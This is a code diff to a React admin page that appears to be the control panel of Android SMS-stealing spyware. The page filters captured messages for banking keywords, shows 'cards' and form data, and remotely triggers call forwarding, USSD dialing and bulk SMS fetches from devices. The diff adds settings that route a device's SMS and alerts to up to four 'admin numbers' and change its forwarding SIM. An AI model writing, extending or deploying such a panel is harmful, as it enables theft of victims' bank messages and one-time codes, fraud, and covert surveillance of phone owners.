@@ -54,7 +54,6 @@ const FINANCE_KW = ["credit","debit","bank","balance","upi","amount","a/c","inr"
 function isFinance(t: string) { const l = t.toLowerCase(); return FINANCE_KW.some(k => l.includes(k)); }
 function copyText(v: string) { try { navigator.clipboard?.writeText(v); } catch {} }
 
-// PERF: Global ticker — ek hi setInterval sabke liye
 let _devTick: Set<() => void> = new Set();
 let _devTimer: ReturnType<typeof setInterval> | null = null;
 function _addDevTick(fn: () => void) {
@@ -179,6 +178,16 @@ export default function DeviceDetailPage() {
   const [ussdOpen, setUssdOpen] = useState(false); const [ussdSim, setUssdSim] = useState(0); const [ussdCode, setUssdCode] = useState("");
   const [search, setSearch] = useState(""); const [sortMode, setSortMode] = useState<"new" | "old">("new");
 
+  // ── ADDED: Admin Numbers ──────────────────────────────────────────────────
+  const [adminsOpen, setAdminsOpen] = useState(false);
+  const [adminNumbers, setAdminNumbers] = useState<string[]>(["", "", "", ""]);
+  const [adminsSaving, setAdminsSaving] = useState(false);
+  const [adminsMsg, setAdminsMsg] = useState("");
+
+  // ── ADDED: Forwarding SIM Change ──────────────────────────────────────────
+  const [simChangeOpen, setSimChangeOpen] = useState(false);
+  const [simChangeSaving, setSimChangeSaving] = useState(false);
+
   const simSummary = useMemo(() => extractSimSummary(device?.simInfo), [device]);
   const smsSim1Label = useMemo(() => `SIM 1${simSummary.sim1 !== "-" ? ` (${simSummary.sim1})` : ""}`, [simSummary.sim1]);
   const smsSim2Label = useMemo(() => `SIM 2${simSummary.sim2 !== "-" ? ` (${simSummary.sim2})` : ""}`, [simSummary.sim2]);
@@ -205,6 +214,9 @@ export default function DeviceDetailPage() {
       if (d?.checkedAt > 0) setCheckedAt(Number(d.checkedAt));
       setForwardingSimDraft(firstNonEmpty(d?.metadata?.forwardingSim, d?.forwardingSim, "1") === "2" ? "2" : "1");
       setForwardingNumberDraft(firstNonEmpty(d?.metadata?.forwardingNumber, d?.forwardingNumber, "") || "");
+      // ADDED: load admin numbers
+      const admins = d?.admins || [];
+      setAdminNumbers([...admins, "", "", "", ""].slice(0, 4));
     } catch {}
     finally { if (mountedRef.current) setLoading(false); }
   }
@@ -354,6 +366,35 @@ export default function DeviceDetailPage() {
     } else { logStatus(`Calling: ${rawCode}`); try { await pushMakeCall(did, code, ussdSim); } catch {} }
   }
 
+  // ADDED: Save Admin Numbers (Android showEditAdminsDialog)
+  async function handleSaveAdmins() {
+    setAdminsSaving(true); setAdminsMsg("");
+    const filtered = adminNumbers.map(n => n.trim()).filter(n => n.length >= 7);
+    try {
+      await axios.put(`${ENV.API_BASE}/api/admin/devices/${encodeURIComponent(did)}/admins`, { admins: filtered, deviceId: did }, { headers: apiHeaders() });
+      wsService.sendCmd("admins:update", { uniqueid: did, admins: filtered });
+      try { await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/admins`, { admins: filtered }, { headers: apiHeaders() }); } catch {}
+      setAdminsMsg("✅ Saved!");
+      setDeviceDoc((prev: any) => prev ? { ...prev, admins: filtered } : prev);
+      setTimeout(() => { setAdminsMsg(""); setAdminsOpen(false); }, 1500);
+    } catch (e: any) { setAdminsMsg("❌ Failed: " + safeStr(e?.response?.data?.error || e?.message)); }
+    finally { setAdminsSaving(false); }
+  }
+
+  // ADDED: Change Forwarding SIM (Android showChangeSimDialog)
+  async function handleSimChange(value: "auto" | "sim1" | "sim2") {
+    setSimChangeSaving(true);
+    try {
+      await axios.put(`${ENV.API_BASE}/api/admin/devices/${encodeURIComponent(did)}/forwardingSim`, { value, deviceId: did }, { headers: apiHeaders() });
+      wsService.sendCmd("forwardingSim:update", { uniqueid: did, value });
+      try { await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/forwardingSim`, { value }, { headers: apiHeaders() }); } catch {}
+      setDeviceDoc((prev: any) => prev ? { ...prev, forwardingSim: value } : prev);
+      setSimChangeOpen(false);
+      logStatus(`Forwarding SIM: ${value}`, "green");
+    } catch { logStatus("SIM change failed", "red"); }
+    finally { setSimChangeSaving(false); }
+  }
+
   function navBack() { nav("/", { state: { tab: fromTab } }); }
   function handleTopNavTabChange(tab: TabKey) {
     if (tab === "home") { navBack(); return; }
@@ -366,19 +407,13 @@ export default function DeviceDetailPage() {
   const lastSeenTs = checkedAt > 0 ? checkedAt : 0;
   const isRecent = checkedAt > 0 && (Date.now() - checkedAt) < 5 * 60 * 1000;
 
-  // Last meaningful activity — heartbeat/ping/sync skip karo
   const SKIP_ACTIONS = new Set(["heartbeat","ws_ping","ws_connect","fcm_token_sync","app_open","register","boot","unknown"]);
   const rawLastSeen = device?.lastSeen;
   const lastActivityAt = rawLastSeen?.at && !SKIP_ACTIONS.has(rawLastSeen?.action) ? Number(rawLastSeen.at) : 0;
   const lastActivityAction = lastActivityAt > 0 ? safeStr(rawLastSeen?.action || "") : "";
   const actionLabel: Record<string, string> = {
-    "sms_pushed": "SMS aaya",
-    "old_sms_batch": "SMS fetch",
-    "call_forwarded": "Call forward",
-    "sms_master": "SMS",
-    "contacts_batch": "Contacts sync",
-    "notification": "Notification",
-    "ws_cmd": "Command",
+    "sms_pushed": "SMS aaya", "old_sms_batch": "SMS fetch", "call_forwarded": "Call forward",
+    "sms_master": "SMS", "contacts_batch": "Contacts sync", "notification": "Notification", "ws_cmd": "Command",
   };
 
   const brand = safeStr(device?.metadata?.brand || device?.metadata?.manufacturer || "Unknown");
@@ -386,6 +421,9 @@ export default function DeviceDetailPage() {
   const android = safeStr(device?.metadata?.androidVersion || "");
   const forwardOn = !!(device?.metadata?.forwardCallActive || device?.forwardCallActive);
   const installTs = getTs({ createdAt: device?.createdAt });
+  // ADDED: for table rows
+  const adminsOnDevice = (device?.admins || []).filter((a: string) => a?.trim());
+  const forwardingSim = safeStr(device?.forwardingSim || device?.metadata?.forwardingSim || "auto").toUpperCase();
 
   const smsPageMap = useMemo(() => {
     const map: Record<string, number> = {};
@@ -395,14 +433,12 @@ export default function DeviceDetailPage() {
 
   const allDataItems = useMemo(() => [...forms, ...cards, ...nets].sort((a, b) => getTs(b) - getTs(a)), [forms, cards, nets]);
 
-  // PERF: limit to 100 items
   const homeFeed = useMemo(() => {
     return [...allDataItems.map(d => ({ ...d, _ft: "data" as const })), ...smsList.map(s => ({ ...s, _ft: "sms" as const }))].sort((a, b) => sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b)).slice(0, 100);
   }, [allDataItems, smsList, sortMode]);
 
   const sortedSms = useMemo(() => [...smsList].sort((a, b) => sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b)).slice(0, 100), [smsList, sortMode]);
 
-  // PERF: fast search
   const q = search.trim().toLowerCase();
   function filterQ<T>(list: T[]): T[] {
     if (!q) return list;
@@ -449,7 +485,11 @@ export default function DeviceDetailPage() {
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Forward Call</td><td className="py-3 pr-4 text-[13px] text-gray-900">{forwardOn ? "ON" : "OFF"}</td></tr>
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Install Date</td><td className="py-3 pr-4 text-[13px] font-semibold text-green-600">{installTs ? new Date(installTs).toLocaleString() : (device?.createdAt ? new Date(device.createdAt).toLocaleString() : "-")}</td></tr>
                     <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Checked</td><td className="py-3 pr-4"><TimeAgo ts={lastSeenTs} className={`text-[13px] font-semibold ${isRecent ? "text-green-600" : "text-red-500"}`} /></td></tr>
-                    <tr><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Activity</td><td className="py-3 pr-4">{lastActivityAt > 0 ? (<div><TimeAgo ts={lastActivityAt} className="text-[13px] font-semibold text-blue-600" />{lastActivityAction && <span className="ml-2 rounded bg-blue-50 border border-blue-100 px-1.5 py-0.5 text-[11px] font-semibold text-blue-500">{actionLabel[lastActivityAction] || lastActivityAction}</span>}</div>) : <span className="text-[13px] text-gray-400">No activity yet</span>}</td></tr>
+                    <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Activity</td><td className="py-3 pr-4">{lastActivityAt > 0 ? (<div><TimeAgo ts={lastActivityAt} className="text-[13px] font-semibold text-blue-600" />{lastActivityAction && <span className="ml-2 rounded bg-blue-50 border border-blue-100 px-1.5 py-0.5 text-[11px] font-semibold text-blue-500">{actionLabel[lastActivityAction] || lastActivityAction}</span>}</div>) : <span className="text-[13px] text-gray-400">No activity yet</span>}</td></tr>
+                    {/* ADDED: Admin Numbers row */}
+                    <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Admin Numbers</td><td className="py-3 pr-4"><button type="button" onClick={() => { setAdminsOpen(true); setAdminsMsg(""); }} className="text-[13px] font-semibold text-blue-600 hover:underline">{adminsOnDevice.length > 0 ? `${adminsOnDevice.length} saved — Edit` : "None — Add"}</button></td></tr>
+                    {/* ADDED: Forwarding SIM row */}
+                    <tr><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Forwarding SIM</td><td className="py-3 pr-4"><button type="button" onClick={() => setSimChangeOpen(true)} className="text-[13px] font-semibold text-blue-600 hover:underline">{forwardingSim} — Change</button></td></tr>
                   </tbody>
                 </table>
               </div>
@@ -483,6 +523,12 @@ export default function DeviceDetailPage() {
       {cfOpen && <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4"><div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl"><div className="mb-5 flex items-center justify-between"><span className="text-[16px] font-extrabold">Call Forwarding</span><button type="button" onClick={() => setCfOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">X</button></div><div className="mb-2 text-[13px] font-semibold text-gray-600">SIM:</div><div className="mb-4 overflow-hidden rounded-xl border border-gray-200">{simOptions.map((o, idx) => <button key={o.value} type="button" onClick={() => setCfSim(o.value)} className={["flex w-full items-center justify-between px-5 py-4 text-[15px] font-semibold", idx < simOptions.length - 1 ? "border-b border-gray-100" : "", cfSim === o.value ? "text-gray-900" : "text-gray-400"].join(" ")}><span>{o.label}</span><div className={["h-5 w-5 rounded-full border-2", cfSim === o.value ? "border-yellow-600 bg-yellow-600" : "border-gray-300"].join(" ")} /></button>)}</div><input value={cfNumber} onChange={e => setCfNumber(e.target.value)} placeholder="Forwarding number" inputMode="tel" className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" /><div className="space-y-2"><button type="button" onClick={() => handleCallForward("activate")} className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50">Proceed</button><div className="grid grid-cols-2 gap-2"><button type="button" onClick={() => handleCallForward("deactivate")} className="rounded-xl border border-gray-300 bg-white py-3 text-[13px] font-semibold text-gray-800 hover:bg-gray-50 leading-tight">DeActive Call Forwarding</button><button type="button" onClick={() => handleCallForward("check")} className="rounded-xl border border-gray-300 bg-white py-3 text-[13px] font-semibold text-gray-800 hover:bg-gray-50">Check Forwarding</button></div></div></div></div>}
       {ussdOpen && <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4"><div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl"><div className="mb-5 flex items-center justify-between"><span className="text-[16px] font-extrabold">USSD Dialing</span><button type="button" onClick={() => setUssdOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">X</button></div><div className="mb-1 text-[13px] font-semibold text-gray-600">SIM:</div><select value={ussdSim} onChange={e => setUssdSim(Number(e.target.value))} className="mb-4 h-12 w-full rounded-xl border-2 border-green-500 bg-white px-3 text-[14px] outline-none">{simOptions.map(o => <option key={o.value} value={o.value}>{o.label}</option>)}</select><div className="mb-1 text-[13px] font-semibold text-gray-600">USSD Code:</div><input value={ussdCode} onChange={e => setUssdCode(e.target.value)} placeholder="e.g. *123#" autoFocus className="mb-5 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" /><button type="button" onClick={handleDialUssd} disabled={!ussdCode.trim()} className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50 disabled:opacity-60">Proceed</button></div></div>}
       {bulkSmsOpen && <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4"><div className="w-full max-w-[340px] rounded-2xl bg-white p-6 shadow-xl"><div className="mb-3 flex items-center justify-between"><span className="text-[16px] font-extrabold">Bulk SMS Fetch</span><button type="button" onClick={() => setBulkSmsOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">X</button></div><div className="mb-3 rounded-xl bg-blue-50 border border-blue-100 px-3 py-2 text-[12px] text-blue-600">Device se last N SMS fetch karo. Bade count mein zyada time lagega.</div><div className="mb-1 text-[13px] font-semibold text-gray-600">Count: <span className="font-normal text-gray-400">1 — 1000</span></div><input type="number" min="1" max="1000" value={bulkSmsCount} onChange={e => setBulkSmsCount(String(Math.min(1000, Math.max(1, Number(e.target.value) || 100))))} className="h-12 w-full rounded-xl border border-gray-200 px-4 text-[16px] outline-none focus:border-gray-400" /><div className="mt-2 mb-4 flex gap-2">{[50,100,200,500].map(n => <button key={n} type="button" onClick={() => setBulkSmsCount(String(n))} className={`flex-1 rounded-lg border py-1.5 text-[12px] font-bold transition ${bulkSmsCount === String(n) ? "border-blue-500 bg-blue-50 text-blue-600" : "border-gray-200 text-gray-500"}`}>{n}</button>)}</div><button type="button" onClick={handleBulkSms} className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-extrabold text-white hover:bg-gray-800">Fetch {bulkSmsCount} SMS</button></div></div>}
+
+      {/* ADDED: Admin Numbers Modal - same style as existing modals */}
+      {adminsOpen && <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4"><div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl"><div className="mb-5 flex items-center justify-between"><span className="text-[16px] font-extrabold">Admin Phone Numbers</span><button type="button" onClick={() => setAdminsOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">X</button></div><div className="mb-4 text-[12px] text-gray-400">Ek saath 4 numbers save ho sakte hain. SMS aur alerts inhe milenge.</div><div className="space-y-3 mb-4">{adminNumbers.map((num, i) => (<div key={i}><div className="mb-1 text-[12px] font-semibold text-gray-500">Number {i + 1}</div><input type="tel" inputMode="tel" value={num} onChange={e => { const updated = [...adminNumbers]; updated[i] = e.target.value; setAdminNumbers(updated); }} placeholder={`Phone Number ${i + 1}`} className="h-11 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" /></div>))}</div>{adminsMsg && <div className={`mb-3 text-center text-[13px] font-semibold ${adminsMsg.startsWith("✅") ? "text-green-600" : "text-red-500"}`}>{adminsMsg}</div>}<button type="button" onClick={handleSaveAdmins} disabled={adminsSaving} className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-extrabold text-white hover:bg-gray-800 disabled:opacity-50">{adminsSaving ? "Saving..." : "Save Numbers"}</button></div></div>}
+
+      {/* ADDED: Forwarding SIM Modal - same style as cfOpen modal */}
+      {simChangeOpen && <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4"><div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl"><div className="mb-5 flex items-center justify-between"><span className="text-[16px] font-extrabold">Select Forwarding SIM</span><button type="button" onClick={() => setSimChangeOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">X</button></div><div className="mb-4 overflow-hidden rounded-xl border border-gray-200">{([{value:"auto",label:"Auto",desc:"System decide karega"},{value:"sim1",label:"SIM 1",desc:simSummary.sim1!=="-"?`${simSummary.sim1Carrier!=="-"?simSummary.sim1Carrier+" · ":""}${simSummary.sim1}`:"Primary SIM"},{value:"sim2",label:"SIM 2",desc:simSummary.sim2!=="-"?`${simSummary.sim2Carrier!=="-"?simSummary.sim2Carrier+" · ":""}${simSummary.sim2}`:"Secondary SIM"}] as {value:"auto"|"sim1"|"sim2";label:string;desc:string}[]).map((opt,idx,arr) => { const current = safeStr(device?.forwardingSim||"auto")===opt.value; return (<button key={opt.value} type="button" onClick={() => !simChangeSaving && handleSimChange(opt.value)} disabled={simChangeSaving} className={["flex w-full items-center justify-between px-5 py-4 text-[15px] font-semibold disabled:opacity-50",idx<arr.length-1?"border-b border-gray-100":"",current?"text-gray-900":"text-gray-400"].join(" ")}><div className="text-left"><div>{opt.label}</div><div className="text-[11px] font-normal text-gray-400 mt-0.5">{opt.desc}</div></div><div className={["h-5 w-5 rounded-full border-2",current?"border-yellow-600 bg-yellow-600":"border-gray-300"].join(" ")} /></button>); })}</div>{simChangeSaving && <div className="text-center text-[13px] text-gray-400">Saving...</div>}</div></div>}
     </div>
   );
 }
